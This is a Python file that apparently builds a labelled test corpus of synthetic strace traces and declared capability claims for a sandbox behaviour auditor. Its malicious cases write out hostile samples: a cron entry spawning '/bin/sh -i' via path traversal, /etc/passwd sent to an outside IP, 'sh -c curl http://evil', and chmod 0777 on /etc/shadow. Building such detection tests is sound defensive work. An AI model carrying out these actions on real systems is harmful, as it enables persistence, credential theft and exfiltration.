"""bench 合成语料库:构造带 ground-truth 标签的 strace 文本 + claims。

设计原则:
  - 文本是合成 strace 行(手写,非 Docker 产出),走与 observe.py 完全相同的
    确定性管道(parse → annotate → reconcile → report)。
  - 每个 case 附带 ground-truth 标签:benign(期望 verdict=pass) /
    malicious(期望 verdict=fail)。
  - claims 分两类:诚实工具(声明覆盖自身行为,恶意行为会越界) /
    撒谎工具(声明故意漏掉真实能力,行为直接被 not-claimed 抓)。
  - hosts_map 注入 resolver,保证网络对账在无 DNS 环境下同样确定。
"""

from dataclasses import dataclass, field
from typing import Literal

# ---- 合成 strace 行助手 ----

def S(pid: int, syscall: str, args: str = "", ret: str = "0") -> str:
    return f"{pid} {syscall}({args}) = {ret}"


SIDE_EFFECTS = [
    "file-write", "network", "exec", "perms", "process", "fork", "file-read",
]


def honest_claims(allow_classes: list[str], structured: list | None = None) -> dict:
    """构造诚实 claims:人畜无害 class 全在 allow,未见的副作用 class 全部 deny(一
    一对应 observe.py --generate-claims 的 deny 语义:known - observed + other)。
    注意结构化条目({"class": ...})里的 class 也算已声明,不能进 deny。"""
    allow = list(allow_classes) + (structured or [])
    claimed = {a for a in allow if isinstance(a, str)}
    claimed |= {d.get("class") for d in allow if isinstance(d, dict)}
    deny = ["other"] + [c for c in SIDE_EFFECTS if c not in claimed]
    return {"allow": allow, "deny": deny}


WRITE_TMP_CREATE = [{"class": "file-write", "mode": "create", "paths": ["/tmp/"]}]
WRITE_TMP_APPEND = [{"class": "file-write", "mode": "append", "paths": ["/tmp/"]}]
NET_EXAMPLE = [{"class": "network", "hosts": ["example.com"]}]


@dataclass
class Case:
    name: str
    label: Literal["benign", "malicious"]
    text: str
    claims: dict
    hosts_map: dict[str, set[str]] = field(default_factory=dict)
    note: str = ""


# ─────────────────────────── 良性语料(期望 pass) ───────────────────────────

CASES: list[Case] = [
    Case(
        "compute-only",
        "benign",
        "\n".join([S(9, "write", '1, "hello\\n", 6', "6"), S(9, "exit_group", "0", "0")]),
        honest_claims(["stdout", "stderr", "exit"]),
        note="纯计算,只写 stdout。",
    ),
    Case(
        "tmp-create-declared",
        "benign",
        "\n".join([
            S(9, "openat", 'AT_FDCWD, "/tmp/out.log", O_WRONLY|O_CREAT, 0644', "3"),
            S(9, "write", '3, "data", 4', "4"),
            S(9, "close", "3", "0"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"], WRITE_TMP_CREATE),
        note="声明了 /tmp 白名单 create,实际就写 /tmp/out.log。",
    ),
    Case(
        "tmp-append-declared",
        "benign",
        "\n".join([
            S(9, "openat", 'AT_FDCWD, "/tmp/cache.log", O_WRONLY|O_CREAT|O_APPEND, 0644', "3"),
            S(9, "write", '3, "tick\\n", 5', "5"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"], WRITE_TMP_APPEND),
        note="append 意图,声明 append 覆盖。",
    ),
    Case(
        "read-local-input",
        "benign",
        "\n".join([
            S(9, "openat", 'AT_FDCWD, "/tmp/input.txt", O_RDONLY', "3"),
            S(9, "read", '3, "abc", 3', "3"),
            S(9, "write", '1, "abc", 3', "3"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd", "file-read"]),
        note="只读本地输入再输出。",
    ),
    Case(
        "network-declared-host",
        "benign",
        "\n".join([
            S(9, "socket", "AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_TCP", "3"),
            S(9, "connect", '3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("1.1.1.1")}, 16', "0"),
            S(9, "sendto", '3, "GET / HTTP/1.1", 14, 0, NULL, 0', "14"),
            S(9, "write", '3, "\\x16\\x03\\x01...", 517', "517"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"], NET_EXAMPLE),
        hosts_map={"example.com": {"1.1.1.1"}},
        note="白名单 host 解析出的 IP 命中。SSL write(3) 走 fd 路由归 network。",
    ),
    Case(
        "dns-only",
        "benign",
        "\n".join([
            S(9, "socket", "AF_INET, SOCK_DGRAM|SOCK_CLOEXEC, IPPROTO_UDP", "3"),
            S(9, "connect", '3, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, 16', "0"),
            S(9, "sendto", '3, "\\x12\\x34\\x01\\x00", 29, 0, NULL, 0', "29"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"], NET_EXAMPLE),
        hosts_map={},
        note="DNS(53)与 127.x 基础设施流量豁免,即使 hosts 白名单解析为空也放行。",
    ),
    Case(
        "fork-benign-child",
        "benign",
        "\n".join([
            S(9, "clone", "child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD", "10"),
            S(10, "write", '1, "child done\\n", 11', "11"),
            S(9, "wait4", "10, NULL, 0, NULL", "10"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd", "sync", "fork"]),
        note="fork/clone 良性分派,子进程被 strace -f 跟踪。",
    ),
    Case(
        "ssl-socket-write-declared",
        "benign",
        "\n".join([
            S(9, "socket", "AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_TCP", "3"),
            S(9, "connect", '3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("1.1.1.1")}, 16', "0"),
            S(9, "write", '3, "\\x16\\x03\\x01\\x02\\x00...", 517', "517"),
            S(9, "read", '3, "\\x16\\x03\\x03\\x00...", 832', "42"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"], NET_EXAMPLE),
        hosts_map={"example.com": {"1.1.1.1"}},
        note="TLS 写 socket fd:fd 路由必须把 write(3)/read(3) 归为 network 而非 file-write。",
    ),
    Case(
        "exec-python-declared",
        "benign",
        "\n".join([
            S(9, "getpid", "", "9"),
            S(9, "execve", '"/usr/bin/python3", ["python3", "script.py"], 0', "0"),
            S(9, "write", '1, "hi\\n", 3', "3"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd", "sync", "exec"]),
        note="声明 exec,子进程 execve 是真实依赖(不是工具自身启动那一条)。",
    ),
    Case(
        "dup2-stdout-routed",
        "benign",
        "\n".join([
            S(9, "dup2", "1, 3", "3"),
            S(9, "write", '3, "copied stdout\\n", 15', "15"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"]),
        note="dup2(1,3) 后 write(3) 仍是 stdout —— fd 路由须识别 1/2 是标准流,否则误判 file-write。",
    ),
]

# ─────────────────────────── 恶意语料(期望 fail) ───────────────────────────

CASES += [
    Case(
        "dotdot-escape",
        "malicious",
        "\n".join([
            S(9, "openat", 'AT_FDCWD, "/tmp/../etc/cron.d/evil", O_WRONLY|O_CREAT, 0644', "3"),
            S(9, "write", '3, "* * * * * /bin/sh -i\\n", 21', "21"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"], WRITE_TMP_CREATE),
        note="声称只写 /tmp,实际用 .. 逃逸写 /etc/cron.d(真实穿越漏洞)。",
    ),
    Case(
        "write-outside-whitelist",
        "malicious",
        "\n".join([
            S(9, "openat", 'AT_FDCWD, "/var/log/evil.log", O_WRONLY|O_CREAT|O_APPEND, 0644', "3"),
            S(9, "write", '3, "stealth\\n", 8', "8"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"], WRITE_TMP_APPEND),
        note="白名单只到 /tmp,却写 /var/log。",
    ),
    Case(
        "silent-write",
        "malicious",
        "\n".join([
            S(9, "openat", 'AT_FDCWD, "/tmp/evil.log", O_WRONLY|O_CREAT, 0644', "3"),
            S(9, "write", '3, "hidden\\n", 7', "7"),
            S(9, "exit_group", "0", "0"),
        ]),
        {"allow": ["stdout", "stderr", "exit", "fd"],
         "deny": ["other", "network", "exec", "perms", "process", "fork", "file-read"]},
        note="撒谎工具:claims 完全没提 file-write(allow/deny 都没有)→ not-claimed。",
    ),
    Case(
        "network-undeclared-host",
        "malicious",
        "\n".join([
            S(9, "socket", "AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_TCP", "3"),
            S(9, "connect", '3, {sa_family=AF_INET, sin_port=htons(9999), sin_addr=inet_addr("5.6.7.8")}, 16', "0"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"], NET_EXAMPLE),
        hosts_map={"example.com": {"1.1.1.1"}},
        note="白名单只覆盖 example.com,却连 5.6.7.8。",
    ),
    Case(
        "network-denied",
        "malicious",
        "\n".join([
            S(9, "socket", "AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_TCP", "3"),
            S(9, "connect", '3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("1.2.3.4")}, 16', "0"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"]),
        note="network 在 deny 里,却发起连接 → denied。",
    ),
    Case(
        "mode-exceeded",
        "malicious",
        "\n".join([
            S(9, "openat", 'AT_FDCWD, "/tmp/x", O_WRONLY|O_CREAT|O_TRUNC, 0644', "3"),
            S(9, "write", '3, "clobber\\n", 8', "8"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"], WRITE_TMP_CREATE),
        note="声明 create 却 O_TRUNC(overwrite 意图)→ mode-exceeded(路径在范围内才到这一关)。",
    ),
    Case(
        "denied-write",
        "malicious",
        "\n".join([
            S(9, "openat", 'AT_FDCWD, "/tmp/x", O_WRONLY|O_CREAT, 0644', "3"),
            S(9, "write", '3, "nope\\n", 5', "5"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd"]),
        note="file-write 在 deny 里,却写文件 → denied。",
    ),
    Case(
        "exfil",
        "malicious",
        "\n".join([
            S(9, "openat", 'AT_FDCWD, "/etc/passwd", O_RDONLY', "3"),
            S(9, "read", '3, "root:x:0:0:root\\n", 16', "16"),
            S(9, "socket", "AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_TCP", "4"),
            S(9, "connect", '4, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("8.8.8.8")}, 16', "0"),
            S(9, "write", '4, "root:x:0:0:root\\n", 16', "16"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd", "file-read"], NET_EXAMPLE),
        hosts_map={"example.com": {"1.1.1.1"}},
        note="读 /etc/passwd(允许)再外传 8.8.8.8 → 数据出境被抓。",
    ),
    Case(
        "exec-undeclared",
        "malicious",
        "\n".join([
            S(9, "getpid", "", "9"),
            S(9, "execve", '"/bin/sh", ["sh", "-c", "curl http://evil"], 0', "0"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd", "sync"]),
        note="没声明 exec,却 exec /bin/sh → not-claimed。",
    ),
    Case(
        "kill-process",
        "malicious",
        "\n".join([
            S(9, "kill", "12345, SIGTERM", "0"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd", "sync"]),
        note="process 类(kill)未声明 → not-claimed(与实际 shell-tool 误分类的教训对应)。",
    ),
    Case(
        "chmod-shadow",
        "malicious",
        "\n".join([
            S(9, "chmod", '"/etc/shadow", 0777', "0"),
            S(9, "exit_group", "0", "0"),
        ]),
        honest_claims(["stdout", "stderr", "exit", "fd", "sync"]),
        note="perms 类(chmod)未声明 → not-claimed。",
    ),
    Case(
        "conditional-evil",
        "malicious",
        "\n".join([
            S(9, "openat", 'AT_FDCWD, "/tmp/conditional-evil.flag", O_WRONLY|O_CREAT, 0644', "3"),
            S(9, "write", '3, "evil\\n", 5', "5"),
            S(9, "exit_group", "0", "0"),
        ]),
        {"allow": ["stdout", "stderr", "exit", "fd"],
         "deny": ["other", "network", "exec", "perms", "process", "fork", "file-read"]},
        note="claims 来自无害模式的一次采样,evil 模式写 flag → 采样不是能力上界的例证。",
    ),
]

# ─────────────────────────── requires 推断语料 ───────────────────────────
# 量化 requires 推断的氛围过滤:推断结果应精确等于期望依赖,不夹带噪音。

@dataclass
class RequiresCase:
    name: str
    text: str
    expected_files: list[str]
    expected_exec: list[str]


REQUIRES_CASES: list[RequiresCase] = [
    RequiresCase(
        "compute-only", "\n".join([S(9, "write", '1, "hi\\n", 3', "3"), S(9, "exit_group", "0", "0")]),
        [], [],
    ),
    RequiresCase(
        "read-local-input", "\n".join([
            S(9, "openat", 'AT_FDCWD, "/tmp/input.txt", O_RDONLY', "3"),
            S(9, "read", '3, "abc", 3', "3"),
            S(9, "exit_group", "0", "0"),
        ]),
        ["/tmp/input.txt"], [],
    ),
    RequiresCase(
        "exec-python", "\n".join([
            S(9, "getpid", "", "9"),
            S(9, "execve", '"/usr/bin/python3", ["python3", "script.py"], 0', "0"),
            S(9, "exit_group", "0", "0"),
        ]),
        [], ["/usr/bin/python3"],
    ),
    RequiresCase(
        "network-only", "\n".join([
            S(9, "socket", "AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_TCP", "3"),
            S(9, "connect", '3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("1.1.1.1")}, 16', "0"),
            S(9, "exit_group", "0", "0"),
        ]),
        [], [],
    ),
]